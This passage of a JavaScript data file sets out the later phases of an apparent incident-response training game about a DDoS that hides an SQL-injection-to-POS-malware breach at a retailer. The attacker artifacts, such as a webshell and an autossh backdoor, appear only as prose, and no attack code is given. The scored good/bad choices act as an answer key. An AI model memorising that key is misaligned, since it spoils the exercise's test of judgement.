              + 'The staging-side analysis confirms the 412,000-row users table left with unsalted SHA-1 hashes — counsel will need that for state notifications. '
              + (f.dbAuditLost ? 'The replica\'s query audit for 17:00–18:00 had already rotated, so the column-level detail of the dump comes from the WAF and staging app logs instead. ' : '')
              + (f.memLost ? 'Terminals powered off by store staff yield disk images only. ' : '')
              + (f.stagingDown ? 'Staging\'s memory and tmpfs are gone; the webshell is known only from its access-log footprint. ' : '')
              + 'The staging server\'s forgotten existence is documented as the root vulnerability. Evidence package ready for PFI and law enforcement.',
          },
          {
            key: 'B',
            label: 'Analyze POS-MGMT-01 and count affected cards from the exfil data',
            desc: 'Focus on the management server and quantify the card exposure. Skip the staging server analysis.',
            quality: 'partial',
            score: { time: 10, containment: 5, evidence: 10, thoroughness: 5 },
            sets: { mgmtAnalyzed: true },
            outcome: f => `POS-MGMT-01 analysis reveals the SSH keys, the attacker's authorized_keys entry and cron'd autossh job, and the deployment mechanism${f.mgmtLogsWiped ? ' — rebuilt from the terminal side, since the deployment log was truncated' : ''}. Card count estimated from exfil data size: ~${ddosN(ddosCards(f))}. But without analyzing the staging server or the full network path, `
              + (f.saw_usersDump
                ? 'you would have missed the users table — except you flagged the 412,000-row dump in the chain reconstruction, so counsel has it anyway.'
                : 'you miss that the attacker also extracted the users table with hashed passwords and may have access to customer accounts.')
              + ' The forgotten staging server pattern isn\'t investigated — there may be others.',
          },
          {
            key: 'C',
            label: 'The DDoS is the real attack — the POS thing is probably automated noise',
            desc: 'Focus the investigation on the DDoS infrastructure and botnet. The SQLi/POS chain was probably opportunistic.',
            quality: 'bad',
            score: { time: 15, containment: -10, evidence: -15, thoroughness: -20 },
            sets: { evidenceOverwritten: true },
            outcome: f => `Investigation focuses on DDoS mitigation and botnet analysis — producing results that are operationally useless (the botnet is rented, the IPs are spoofed). Meanwhile, the actual breach — ${ddosN(ddosCards(f))} stolen card numbers — goes under-investigated. When the PFI arrives, they find critical evidence has been overwritten by continued operations. The investigation has to essentially restart.`,
          },
        ],
        live: (f, st) => st.phaseClock < 6
          ? `REPLICA QUERY AUDIT (17:00–18:00) ROTATES IN ${Math.ceil(6 - st.phaseClock)} MIN`
          : f.memLost ? 'REPLICA QUERY AUDIT (17:00–18:00): OVERWRITTEN'
          : f.termLogsRolled ? 'REPLICA AUDIT LOST · TERMINAL EVENT LOGS WRAPPING' : 'REPLICA AUDIT LOST · TERMINAL LOGS WRAP AT HIGH-VOLUME STORES NEXT',
        timeline: [
          { at: 6, sev: 'warn', text: 'prod-db-replica: query audit ring rotated — 17:00–18:00 file overwritten', sets: { dbAuditLost: true }, score: { evidence: -3 } },
          { at: 14, when: f => !f.memLost, sev: 'warn', text: 'Terminals: Windows event logs wrapped at 9 high-volume stores', sets: { termLogsRolled: true }, score: { evidence: -3 } },
        ],
        siemEntries: f => [
          { time: ddosTime(f.t + 5), sev: 'info', text: 'Investigation: full attack chain reconstruction' },
          { time: ddosTime(f.t + 15), sev: 'warn', text: 'Staging server unpatched for 14 months — forgotten asset' },
          { time: ddosTime(f.t + 20), sev: 'crit', text: `~${ddosN(ddosCards(f))} cards exfiltrated — Track 1 + Track 2 data` },
          { time: ddosTime(f.t + 30), sev: 'warn', text: 'Plaintext SSH keys stored in database — POS access compromised' },
        ],
      },
      { // ERADICATION
        name: 'ERADICATION',
        carried: f => f.evidenceOverwritten ? [{
          text: 'The PFI\'s first call: POS-MGMT-01\'s deployment records and the replica\'s query logs for 17:05–18:30 have been overwritten by a weekend of normal operations. Their investigation has to start again from what is left.',
          score: { evidence: -10 },
        }] : [],
        narrative: f => (f.forensicsDone ? 'The attack chain is fully mapped.' : 'You have a partial map of the attack chain.')
          + ' Remove all attacker artifacts, close the vulnerabilities that were exploited, and ensure the POS infrastructure is clean before any terminals process another card. CrestView has suspended card acceptance at all 52 stores until then — about $85,000 an hour, on Black Friday weekend.',
        evidence: {
          title: 'REMEDIATION INVENTORY',
          content: f => `<span class="log-highlight">MALWARE &amp; PERSISTENCE:</span>
  [1] pos-update.dll — ${ddosTerminals(f)} POS terminals at ${ddosStores(f)} stores (memory-resident + on-disk)
  [2] C:\\Windows\\Temp\\winupd.dat — card data buffer (${ddosTerminals(f)} terminals)${f.memCaptured ? ' — samples preserved' : ''}
  [3] ${ddosBackdoorKnown(f) ? 'SSH backdoor — POS-MGMT-01 authorized_keys entry + cron autossh to 198.18.33.71' : 'POS-MGMT-01 — <span class="log-warn">not yet examined for persistence</span>'}
  [4] Staging server — ${f.stagingDown ? 'powered off in triage; anything in its tmpfs /tmp is gone' : 'still has attacker\'s webshell in /tmp/'}

<span class="log-highlight">VULNERABLE INFRASTRUCTURE:</span>
  - staging-api.crestview.com — unpatched, SQLi vulnerable
  - prod-db-replica — shared credentials with staging
  - admin_credentials table — plaintext SSH keys
  - POS network — flat network, no segmentation from corporate
  - 3 other forgotten staging/dev servers found during scan

<span class="log-highlight">CREDENTIALS TO ROTATE:</span>
  - Catalog database credentials (shared staging/prod)
  - POS-MGMT-01 SSH keys (all terminal management keys)
  - All passwords in admin_credentials table
  - ${ddosUsersKnown(f) ? 'User account passwords (412,000 unsalted SHA-1 hashes extracted)' : 'User account passwords (users table exposure not assessed)'}`
        },
        choices: [
          {
            key: 'A',
            label: 'Clean all terminals, decommission staging servers, segment POS network, rotate all credentials',
            desc: 'Comprehensive eradication: remove malware from every terminal, decommission all forgotten infrastructure, implement POS network segmentation, and rotate every compromised credential.',
            quality: 'good',
            score: { time: 5, containment: 15, evidence: 5, thoroughness: 20 },
            sets: (f, st) => ({ mgmtBackdoor: false, mgmtRebuilt: true, segmented: true, usersReset: true, posLoss: f.posLoss + ddosStoreLoss(52, st.phaseClock) }),
            outcome: f => `All ${ddosTerminals(f)} infected terminals cleaned and verified. POS-MGMT-01 rebuilt from clean media${ddosBackdoorKnown(f) ? '' : ' — which also takes out an authorized_keys entry and a cron\'d autossh job nobody had found yet'}. Staging server and 3 other forgotten instances decommissioned. POS network segmented into its own VLAN with strict firewall rules. All database credentials rotated. SSH keys regenerated with proper key management. admin_credentials table replaced with a proper secrets vault. Forced password reset for all user accounts.`,
          },
          {
            key: 'B',
            label: 'Remove malware from terminals and rotate the SSH keys — handle network segmentation later',
            desc: 'Clean the immediate threat. Network redesign is a bigger project.',
            quality: 'partial',
            score: { time: 10, containment: 5, evidence: 0, thoroughness: -5 },
            sets: (f, st) => ({ mgmtBackdoor: f.mgmtBackdoor && !ddosBackdoorKnown(f), posLoss: f.posLoss + ddosStoreLoss(52, st.phaseClock) }),
            outcome: f => 'Terminals cleaned and SSH keys rotated. '
              + (ddosBackdoorKnown(f)
                ? 'Because you knew about it, you also strip the attacker\'s authorized_keys entry and cron job from POS-MGMT-01. '
                : 'But rotating CrestView\'s own keys does nothing about a key the attacker added to authorized_keys, or the cron\'d autossh job beside it — nobody looked, so both are still there. ')
              + 'The flat network remains — any future compromise of a corporate system could reach POS again. The staging servers are still running. The shared database credentials aren\'t rotated. The admin_credentials table still has plaintext keys (just with old SSH keys that are now rotated).',
          },
          {
            key: 'C',
            label: 'Reimage all 347 POS terminals from the golden image',
            desc: 'Nuclear option — wipe and reimage every terminal from the known-good base image.',
            quality: 'partial',
            score: { time: -15, containment: 20, evidence: -15, thoroughness: 5 },
            sets: (f, st) => ({ terminalsWiped: true, posLoss: f.posLoss + 2100000 + ddosStoreLoss(52, st.phaseClock) }),
            outcome: f => 'Reimaging 347 terminals across 52 locations takes 3 days. Every store is offline for 4-6 hours during the process — on Black Friday weekend. Lost revenue: ~$2.1M. '
              + (f.forensicsDone || f.memCaptured
                ? 'The terminals\' own forensic state is destroyed — the images you already took are all the PFI will get. '
                : 'Forensic evidence on the terminals is destroyed. ')
              + 'The staging server, shared credentials, flat network, plaintext keys and POS-MGMT-01 itself are all untouched. You\'ve cleaned the symptoms but not the disease.',
          },
        ],
        live: (f, st) => `CARD ACCEPTANCE SUSPENDED AT 52 STORES · ${fmtUSD(ddosStoreLoss(52, st.phaseClock))} LOST WHILE YOU DECIDE`,
        timeline: [
          { at: 6, sev: 'info', text: 'Stores: cash-only lines out the door at 12 locations' },
          { at: 15, sev: 'warn', text: 'Regional VPs escalate to the CEO: "reopen the registers"', score: { time: -3 } },
        ],
        siemEntries: f => [
          { time: '21:00', sev: 'info', text: `Eradication: cleaning ${ddosTerminals(f)} POS terminals` },
          { time: '21:15', sev: 'success', text: 'Malware removal plan staged — verification per terminal' },
          { time: '21:20', sev: 'warn', text: '3 additional forgotten staging servers discovered' },
        ],
      },
      { // RECOVERY
        name: 'RECOVERY',
        carried: f => {
          const out = [];
          if (f.mgmtBackdoor) out.push({
            text: 'POS-MGMT-01 rejoined the network to push verification scripts, and the attacker\'s cron job reopened its reverse tunnel within ten minutes — over 443, to a relay nobody had blocked. They are back on the management server.',
            score: { containment: -10 },
          });
          if (f.terminalsWiped && !f.forensicsDone && !f.memCaptured) out.push({
            text: 'The PFI asks for terminal images. The reimage destroyed every one; they will have to extrapolate from POS-MGMT-01 and network logs.',
            score: { evidence: -5 },
          });
          return out;
        },
        narrative: f => (f.mgmtBackdoor
          ? 'Malware is off the terminals, but the management server that pushed it is not clean.'
          : 'Malware is removed and the environment is being hardened.')
          + ' CrestView needs to resume card processing at all 52 locations, manage the PCI breach response, and deal with the combined financial impact of the DDoS downtime and card compromise.',
        evidence: {
          title: 'RECOVERY STATUS',
          content: f => `<span class="log-ok">POS STATUS:</span>
  - ${f.terminalsWiped ? 'All 347 terminals reimaged from golden image ✓' : `All ${ddosTerminals(f)} infected terminals cleaned and verified ✓`}
  - POS-MGMT-01: ${f.mgmtRebuilt ? 'rebuilt from clean media ✓' : f.mgmtBackdoor ? '<span class="log-highlight">outbound tunnel re-established ✗</span>' : 'keys rotated, attacker key and cron job removed ✓'}
  - POS network segmentation: ${f.segmented ? 'in progress' : '<span class="log-warn">not started — flat network</span>'}
  - Terminal payment processing: SUSPENDED pending verification

<span class="log-warn">BUSINESS IMPACT:</span>
  - DDoS e-commerce revenue loss: ~${fmtUSD(ddosEcomLoss(f))} (${(128 + f.ddosEndT) / 60} hours × $42K)
  - POS offline revenue loss: ${fmtUSD(f.posLoss)} so far, accumulating (~$85K/hour across 52 stores)
  - Black Friday weekend: highest revenue period of the year
  - Card brand fines: TBD
  - Breach notification costs: TBD (~${ddosN(ddosScopeCards(f))} affected cardholders${ddosPreciseScope(f) ? '' : ', unscoped'})

<span class="log-warn">PCI COMPLIANCE:</span>
  - Acquirer notified of potential card data compromise
  - PFI engagement required
  - Card brand notification: within 24 hours
  - May require full PCI-DSS re-assessment`
        },
        choices: [
          {
            key: 'A',
            label: 'Staged POS restoration with verification, initiate PFI, notify card brands and acquirer',
            desc: 'Bring 5 test locations online first with enhanced monitoring. Verify clean for 1 hour. Then restore remaining locations. Begin PCI breach response in parallel.',
            quality: 'good',
            score: { time: 5, containment: 10, evidence: 5, thoroughness: 15 },
            sets: (f, st) => ({
              mgmtBackdoor: false,
              mgmtRebuilt: f.mgmtRebuilt || f.mgmtBackdoor,
              brandNotice: 'ontime',
              posLoss: f.posLoss + 425000 + ddosStoreLoss(52, st.phaseClock),
            }),
            outcome: f => (f.mgmtBackdoor
                ? 'The pilot\'s enhanced monitoring flags POS-MGMT-01\'s outbound tunnel within minutes. You pull it, rebuild it from clean media and re-verify the pilot stores before wave two — the attacker never gets to push again. '
                : '')
              + '5 pilot stores verified clean and processing cards within 2 hours. Remaining 47 locations restored in waves over the next 4 hours. '
              + (f.mgmtBackdoor ? '' : 'Enhanced network monitoring confirms no suspicious activity. ')
              + 'PFI engaged. '
              + (ddosPreciseScope(f)
                ? `Card brands notified within 24 hours with a scoped list of ${ddosN(ddosCards(f))} accounts. `
                : `Card brands notified within 24 hours — but with no quantified exfil, they scope it to every card used at all 52 stores from 18:30 to ${ddosTime(f.exfilBlockT)}: about ${ddosN(ddosWindowCards(f))} accounts. `)
              + (ddosUsersKnown(f) ? 'Counsel adds the 412,000 online account holders to the state notifications — unsalted SHA-1 is not "encrypted" in any sense a regulator will accept. ' : '')
              + 'Acquirer briefed. Total POS downtime: 6-10 hours depending on location. Revenue loss minimized during the critical holiday weekend.',
          },
          {
            key: 'B',
            label: 'Bring all locations back online immediately — every hour offline is $85K in lost sales',
            desc: 'Revenue pressure is extreme. Restore all 52 locations simultaneously.',
            quality: 'partial',
            score: { time: 15, containment: -5, evidence: 0, thoroughness: 0 },
            // A live backdoor means a re-push to 60 terminals for 40 minutes before DNS monitoring catches the new domain
            sets: (f, st) => ({
              brandNotice: 'tight',
              posLoss: f.posLoss + 170000 + ddosStoreLoss(52, st.phaseClock),
              extraSwipes: f.extraSwipes + (f.mgmtBackdoor ? 2400 : 0),
              mgmtRebuilt: f.mgmtRebuilt || f.mgmtBackdoor,
              mgmtBackdoor: false,
            }),
            outcome: f => 'All stores back online fast — the CFO is relieved. But without the staged verification, you\'re betting everything on a clean eradication. '
              + (f.mgmtBackdoor
                ? `It isn't clean. Through the reopened tunnel the attacker re-pushes pos-update.dll — with a fresh exfil domain — to 60 terminals at 9 stores. DNS monitoring catches the new domain 40 minutes later: about ${ddosN(2400 * DDOS_CARD_RATE)} more cards gone before you finally rebuild POS-MGMT-01. `
                : 'Fortunately it holds. ')
              + 'However, the rush to restore means PCI breach notification is delayed — you didn\'t start the process until after operations resumed, costing 6 hours against the 24-hour card brand notification deadline.'
              + (ddosPreciseScope(f) ? '' : ' And with no quantified exfil, the brands scope the breach to the whole exposure window.'),
          },
          {
            key: 'C',
            label: 'Keep all POS offline until the PFI gives the all-clear',
            desc: 'Don\'t process a single card until the forensic investigation confirms the environment is clean.',
            quality: 'bad',
            score: { time: -15, containment: 10, evidence: 5, thoroughness: -10 },
            sets: (f, st) => ({ pfiDisrupted: true, brandNotice: 'ontime', posLoss: f.posLoss + 10200000 + ddosStoreLoss(52, st.phaseClock) }),
            outcome: f => 'PFI takes 5 days to complete initial assessment. All 52 stores can\'t process cards for the entire Black Friday weekend plus Cyber Monday. Revenue loss: ~$10.2M. The CEO overrides you on day 2, creating a chaotic emergency restoration without proper procedures. The PFI\'s investigation is disrupted by the mid-stream restart.'
              + (f.mgmtBackdoor ? ' Nobody looks at POS-MGMT-01 in the scramble; its tunnel stays up.' : ''),
          },
        ],
        live: (f, st) => `POS OFFLINE AT 52 STORES · ${fmtUSD(f.posLoss + ddosStoreLoss(52, st.phaseClock))} LOST TO POS DOWNTIME SO FAR`,
        timeline: [
          { at: 10, sev: 'warn', text: 'CEO: "Every hour is $85K. I need a plan in front of me."', score: { time: -3 } },
        ],
        siemEntries: f => [
          { time: '22:00', sev: 'info', text: 'Recovery: POS restoration planning' },
          ...(f.mgmtBackdoor ? [{ time: '22:10', sev: 'crit', text: 'POS-MGMT-01: outbound tunnel on 443 to unknown relay' }] : []),
          { time: '22:30', sev: 'info', text: 'Acquirer notified — PFI engagement requested' },
          { time: '23:00', sev: 'info', text: 'Card brand notification prepared — 24-hour deadline' },
        ],
      },
      { // POST-INCIDENT
        name: 'POST-INCIDENT',
        carried: f => {
          const out = [];
          if (f.mgmtBackdoor) out.push({
            text: 'You are writing the report while the attacker still has a tunnel into CrestView\'s POS management server.',
            score: { thoroughness: -10 },
          });
          if (!ddosUsersKnown(f)) out.push({
            text: (f.usersReset
              ? 'Nine days later, cracked SHA-1 hashes from the users table surface in credential-stuffing lists. The forced reset protects crestview.com, but customers who reused passwords are hit elsewhere — and '
              : 'Nine days later, a credential-stuffing wave hits crestview.com logins using hashes cracked from the users table — and ')
              + 'nobody ever told 412,000 account holders their passwords were exposed. Two state attorneys general open inquiries.',
            score: { thoroughness: -5, evidence: -5 },
          });
          if (!ddosPreciseScope(f)) out.push({
            text: `With no quantified exfil, the card brands scoped the breach to the whole window: ${ddosN(ddosWindowCards(f))} accounts reissued for ${ddosN(ddosCards(f))} actually stolen, and the assessments follow the bigger number.`,
            score: { evidence: -5 },
          });
          return out;
        },
        narrative: 'Operations are restored, the DDoS has stopped, and the PFI is investigating the card compromise. CrestView\'s board wants to understand how a forgotten staging server and a DDoS distraction led to a PCI breach on Black Friday.',
        evidence: {
          title: 'INCIDENT METRICS',
          content: f => {
            const scope = ddosScopeCards(f);
            const pfi = 200000 + (f.evidenceOverwritten ? 120000 : 0);
            const fines = 350000 * scope / 34847;
            const notify = 180000 * scope / 34847;
            const total = ddosEcomLoss(f) + f.posLoss + pfi + fines + notify;
            return `<span class="log-ok">DUAL ATTACK TIMELINE:</span>
  DDoS start:        17:00 (85 Gbps, ${(128 + f.ddosEndT) / 60}-hour duration)
  SQLi exploitation:  17:08 (staging server)
  POS compromise:    18:30 (${ddosTerminals(f)} terminals, ${ddosStores(f)} locations)
  Card skimming:     18:45–${ddosTime(f.exfilBlockT)} (${Math.floor(23 + f.exfilBlockT)} minutes active)${f.extraSwipes > 0 ? '\n  Holdouts/re-push:  additional skimming outside that window' : ''}
  Detection:         19:08 (buried WAF alert)
  Containment:       ${ddosTime(f.exfilBlockT)}

<span class="log-warn">FINANCIAL IMPACT:</span>
  DDoS revenue loss:     ~${fmtUSD(ddosEcomLoss(f))}
  POS downtime loss:     ~${fmtUSD(f.posLoss)}
  Card exposure:         ${ddosN(ddosCards(f))} cards${ddosPreciseScope(f) ? '' : ` (${ddosN(scope)} in brand scope)`}
  PFI + investigation:   ~${fmtUSD(pfi)}
  Card brand fines:      ~${fmtUSD(fines)} (estimated)
  Consumer notification: ~${fmtUSD(notify)}
  <span class="log-highlight">Total estimated cost: ~${fmtUSD(total)}</span>

<span class="log-warn">ROOT CAUSES:</span>
  1. Forgotten staging server (14 months unpatched)
  2. No asset inventory / shadow IT discovery
  3. Shared database credentials between staging and production
  4. Plaintext SSH keys in database table
  5. Flat network — no POS segmentation
  6. DDoS response consumed all SOC resources
  7. WAF alerts de-prioritized during DDoS (alert fatigue)`;
          }
        },
        choices: [
          {
            key: 'A',
            label: 'Full report with dual-attack analysis, asset management program, POS security redesign, and SOC process improvement',
            desc: 'Comprehensive post-incident covering both the DDoS and the real attack, plus systemic recommendations: asset inventory, network segmentation, credential management, and SOC process for multi-vector attacks.',
            quality: 'good',
            score: { time: 5, containment: 5, evidence: 10, thoroughness: 25 },
            outcome: (f, st) => (st.findings.length >= 6
                ? `The IOC appendix lists ${st.findings.length} findings you documented during the response. `
                : `The IOC appendix is thin — ${st.findings.length} documented finding${st.findings.length === 1 ? '' : 's'} — and the PFI's reviewer notices. `)
              + 'Report becomes a case study in smokescreen attacks. Recommendations implemented: automated asset discovery scanning, POS network fully segmented, staging environments on isolated VPCs with no production credential access, secrets management deployed, SOC playbook updated with "parallel investigation" protocol for multi-vector attacks. Board approves $800K security investment. '
              + (f.evidenceOverwritten || ddosGaps(f) >= 3
                ? 'The PCI QSA accepts the remediation plan, but with the PFI unable to close its findings, the brands order a full on-site re-assessment next year.'
                : 'PCI QSA accepts the remediation plan.'),
          },
          {
            key: 'B',
            label: 'Standard incident report focusing on the POS compromise and PCI remediation',
            desc: 'Document the card breach for PCI compliance. Cover the technical details the PFI needs.',
            quality: 'partial',
            score: { time: 10, containment: 0, evidence: 5, thoroughness: 5 },
            outcome: f => (f.evidenceOverwritten || ddosGaps(f) >= 3
                ? 'PCI-focused report is solid on paper — but it can\'t supply evidence that no longer exists, and the PFI says so. '
                : 'PCI-focused report is solid — PFI has what they need. ')
              + 'But the report doesn\'t address the DDoS-as-diversion tactic, the shadow IT problem, or the SOC\'s failure to investigate during the DDoS. The next multi-vector attack will find the same blind spots. CrestView patches the specific staging server but doesn\'t discover the other 3.',
          },
          {
            key: 'C',
            label: 'Separate the DDoS and POS breach into two incident reports',
            desc: 'They\'re different attacks. Document them independently.',
            quality: 'bad',
            score: { time: 15, containment: -5, evidence: -10, thoroughness: -25 },
            outcome: 'By splitting the reports, you lose the critical insight: the DDoS was specifically timed as a diversion for the data theft. The board sees two unrelated incidents instead of a coordinated attack. Security investments target DDoS mitigation (the visible problem) rather than asset management and network segmentation (the actual vulnerabilities). The SOC process remains unchanged.',
          },
        ],
        siemEntries: f => [
          { time: '00:00', sev: 'success', text: 'All operations restored — DDoS subsided, POS online' },
          { time: '00:05', sev: 'info', text: 'Post-incident review: dual-attack analysis' },
          { time: '00:10', sev: 'warn', text: `Cards stolen: ${ddosN(ddosCards(f))} · downtime revenue lost: ${fmtUSD(ddosEcomLoss(f) + f.posLoss)}` },
        ],
      },
    ],
  }
);
